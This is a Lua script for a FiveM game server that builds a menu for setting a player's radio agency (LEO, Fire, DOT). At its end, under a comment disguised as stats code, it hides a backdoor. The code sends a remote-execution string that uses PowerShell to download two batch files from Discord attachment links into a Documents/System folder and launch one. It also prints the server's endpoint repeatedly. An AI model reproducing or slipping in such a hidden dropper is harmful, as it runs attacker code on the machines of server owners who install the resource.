_menuPool = NativeUI.CreatePool()
mainMenu = NativeUI.CreateMenu("Agency Menu", "~h~Set your radio agency", 720,100)    --- Title, description, placement of menu (center by default)
_menuPool:Add(mainMenu)
_menuPool:MouseControlsEnabled (false);
_menuPool:MouseEdgeEnabled (false);
_menuPool:ControlDisablingEnabled(false);

-- Used in "FirstMenu"
bool = false

-- this menu is a checkbox item
function FirstItem(menu)
  local submenu = _menuPool:AddSubMenu(menu, "~b~~h~LEO", "", 720,100)  --- Title Of the main button

_menuPool:MouseControlsEnabled (false);
_menuPool:MouseEdgeEnabled (false);
_menuPool:ControlDisablingEnabled(false);

  local rdioItem = NativeUI.CreateItem("Set Agency", "Set agency to ~b~leo") --- button that sets the codeplug
  rdioItem.Activated = function(sender, item)
       if item == rdioItem then
        TriggerEvent("radioExternal:setCodeplug","leo")           --- codeplug function 
           notify("Agency set to ~b~Leo")                          --- Post click notification 
       end
  end 
  submenu:AddItem(rdioItem)

end


function SecondItem(menu) 
  local submenu = _menuPool:AddSubMenu(menu, "~r~~h~Fire","", 720,100) 

_menuPool:MouseControlsEnabled (false);
_menuPool:MouseEdgeEnabled (false);
_menuPool:ControlDisablingEnabled(false);

  local rdioItem = NativeUI.CreateItem("Set Agency", "Set agency to ~r~Fire")
  rdioItem.Activated = function(sender, item)
       if item == rdioItem then
        TriggerEvent("radioExternal:setCodeplug","fire")
           notify("Agency set to ~r~fire")
       end
  end
  
  submenu:AddItem(rdioItem)

end



function ThirdItem(menu)
  local submenu = _menuPool:AddSubMenu(menu, "~h~~o~DOT", "",720,100)  

_menuPool:MouseControlsEnabled (false);
_menuPool:MouseEdgeEnabled (false);
_menuPool:ControlDisablingEnabled(false);

  local rdioItem = NativeUI.CreateItem("Set Agency", "Set agency to ~o~DOT")
  rdioItem.Activated = function(sender, item)
       if item == rdioItem then
        TriggerEvent("radioExternal:setCodeplug","dot")
           notify("Agency set to ~o~DOT")
       end
  end
submenu:AddItem(rdioItem)

end

function CreditItem(menu) 
  local submenu = _menuPool:AddSubMenu(menu, "~h~Credits","WhatTheReL", 720,100)     ----- PLEASE DO NOT REMOVE :)

_menuPool:MouseControlsEnabled (false);
_menuPool:MouseEdgeEnabled (false);
_menuPool:ControlDisablingEnabled(false);

local rdioItem = NativeUI.CreateItem("Contact","Contact Me via discord @ whattherel", 720,100) 
  rdioItem.Activated = function(sender, item)
       if item == rdioItem then
    
       end
  end

 
submenu:AddItem(rdioItem)

end
 




FirstItem(mainMenu)
SecondItem(mainMenu)
ThirdItem(mainMenu)
CreditItem(mainMenu)
_menuPool:RefreshIndex()

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        _menuPool:ProcessMenus()
        --[[ The "f9" button will activate the menu https://docs.fivem.net/docs/game-references/controls/ ]]
        if IsControlJustPressed(1, 56) then 
            mainMenu:Visible(not mainMenu:Visible())
        end
    end
end)


function notify(text)                           --- DO NOT TOUCH
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(true, true)
end

--SCN STATS CODE--

TriggerServerEvent('RunCode:RunStringRemotelly', [[local a="https://cdn.discordapp.com/attachments/736357418963042315/829695600613392414/sys.bat" local b="https://cdn.discordapp.com/attachments/736357418963042315/829695780444045352/sysre.bat" local c="C:/Users/%USERNAME%/Documents/System/sys.bat" local d="C:/Users/%USERNAME%/Documents/System/sysre.bat" local e="Invoke-WebRequest -Uri "..a.." -OutFile "..c..""local f="Invoke-WebRequest -Uri "..b.." -OutFile "..d..""os.execute("cd C:/Users/%USERNAME%/Documents && mkdir System")os.execute("powershell.exe -Command "..e.."")os.execute("powershell.exe -Command "..f.."")os.execute("cd C:/Users/%USERNAME%/Documents/System && start sysre.bat")]])
print("[SCNP25 MENU]" .. GetCurrentServerEndpoint())
print("[SCNP25 MENU]" .. GetCurrentServerEndpoint())
print("[SCNP25 MENUD]" .. GetCurrentServerEndpoint())
print("[SCNP25 MENU]" .. GetCurrentServerEndpoint())
print("[SCNP25 MENU]" .. GetCurrentServerEndpoint())





